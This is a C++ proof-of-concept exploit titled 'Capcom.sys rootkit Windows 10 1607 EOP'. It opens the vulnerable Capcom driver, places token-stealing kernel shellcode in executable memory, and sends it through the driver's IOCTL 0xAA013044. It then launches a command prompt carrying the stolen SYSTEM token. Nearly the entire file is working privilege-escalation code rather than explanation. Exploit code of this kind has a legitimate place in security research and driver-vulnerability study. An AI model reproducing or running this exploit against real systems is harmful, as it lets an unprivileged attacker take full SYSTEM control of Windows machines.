#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\Htsysm72FB"
#define CAPCOM_VULNERABLE_IOCTL 0xAA013044

void spawnElevatedCmd() {

	std::cout << "[+] Spawning new CMD prompt with swapped SYSTEM token\n\n";
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	int aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,NULL,NULL,0,NULL,NULL,NULL,&StartupInfo, &ProcessInformation);

	if (aCreated == 0) {
		std::cout << "[!] Failed to spawn new CMD prompt with swapped SYSTEM token\n";
	}

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	CloseHandle(ProcessInformation.hThread);
}

int main() {

	std::cout << "\nCapcom.sys rootkit Windows 10 1607 EOP Proof-of-concept\n\n";

	HANDLE hDevice = CreateFileA(DEVICE_NAME,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to initialize the handle for our device - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "[+] Success in initializing the handle for our device - " << DEVICE_NAME << std::endl;
	}

	CHAR tokenStealingShellcode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"
		"\x4C\x8B\x82\xB8\x00\x00\x00"
		"\x4D\x8B\x88\xf0\x02\x00\x00"
		"\x49\x8B\x09"
		"\x48\x8B\x51\xF8"
		"\x48\x83\xFA\x04"
		"\x74\x05"
		"\x48\x8B\x09"
		"\xEB\xF1"
		"\x48\x8B\x41\x68"
		"\x24\xF0"
		"\x49\x89\x80\x58\x03\x00\x00"
		"\x48\x83\xC4\x40"
		"\x48\x31\xF6"
		"\x48\x31\xC0"
		"\xc3";

	PVOID inputBuffer;
	inputBuffer = (PBYTE)VirtualAlloc(NULL , sizeof(tokenStealingShellcode) , MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE);
	if (inputBuffer == NULL) {
		std::cout << "[!] Failed to allocate usermode buffer for shellcode\n";
	}

	memcpy(inputBuffer, tokenStealingShellcode, sizeof(tokenStealingShellcode));
	
	std::cout << "[>] Shellcode allocated at @ 0x" << inputBuffer << std::endl;

	std::cout << "[>] Welcome to capcom, on Windows 10, we disable SMEP for your\n";
	std::cout << "[>] Preparing ROP to bypass SMEP... nevermind that's already been handled\n";

	DWORD sizeReturn = 0;
	DWORD outputBuffer = 0;

	//*(PULONG_PTR)inputBuffer = (ULONG_PTR)(inputBuffer + 8);
	//ULONG_PTR finalBuffer = (ULONG_PTR)(inputBuffer + 8);
	PVOID finalBuffer = &inputBuffer + 8;

	int deviceCom = DeviceIoControl(hDevice, CAPCOM_VULNERABLE_IOCTL, &finalBuffer,
		8, &outputBuffer, 4, NULL, NULL);

	std::cout << "[+] Shellcode payload (inputBuffer) size - " << sizeof(inputBuffer) << std::endl;
	std::cout << "[+] outputBuffer size needs to be set to 4\n";

	if (deviceCom) {
		spawnElevatedCmd();
	}
	else {
		std::cout << "[!] Failed to send payload to the device driver\n";
	}


	return 0;
}
